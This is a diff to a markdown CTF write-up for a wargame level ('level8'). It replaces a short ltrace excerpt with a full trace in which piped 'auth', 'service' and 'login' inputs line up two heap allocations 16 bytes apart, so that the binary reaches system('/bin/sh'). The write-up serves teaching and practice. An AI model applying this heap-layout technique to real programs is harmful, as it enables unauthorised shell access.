@@ -149,17 +149,27 @@ Each chunk includes hidden metadata (size, flags) managed by the allocator.
 Using `ltrace` to see actual addresses:
 
 ```bash
-$ ltrace ./level8
-...
-printf("%p, %p \n", nil, nil)
-auth AAAA
-malloc(4)  = 0x0804a008  ← auth allocated here
-...
-service BBBBBBBBBBBBBBBB
-strdup("BBBBBBBBBBBBBBBB")
-malloc(17) = 0x0804a018  ← service allocated here (16 bytes after!)
-...
+$ (echo "auth AAAA"; echo "service BBBBBBBBBBBBBBBB"; echo "login") | ltrace ./level8
+__libc_start_main(0x8048564, 1, 0xbffffd24, 0x8048740, 0x80487b0 <unfinished ...>
+printf("%p, %p \n", (nil), (nil)(nil), (nil)
+)                                                                        = 14
+fgets("auth AAAA\n", 128, 0xb7fd1ac0)                                                                    = 0xbffffc00
+malloc(4)                                                                                                = 0x0804a008
+strcpy(0x0804a008, "AAAA\n")                                                                             = 0x0804a008
+printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil)
+)                                                                    = 18
+fgets("service BBBBBBBBBBBBBBBB\n", 128, 0xb7fd1ac0)                                                     = 0xbffffc00
+strdup(" BBBBBBBBBBBBBBBB\n")                                                                            = 0x0804a018
+printf("%p, %p \n", 0x804a008, 0x804a0180x804a008, 0x804a018
+)                                                                = 22
+fgets("login\n", 128, 0xb7fd1ac0)                                                                        = 0xbffffc00
+system("/bin/sh" <unfinished ...>
 ```
+
+**Key observations:**
+- `malloc(4) = 0x0804a008` ← auth allocated here
+- `strdup(" BBBBBBBBBBBBBBBB\n")` calls malloc internally
+- Second allocation at `0x0804a018` ← service allocated here (16 bytes after!)
 
 **Distance calculation:**
 ```
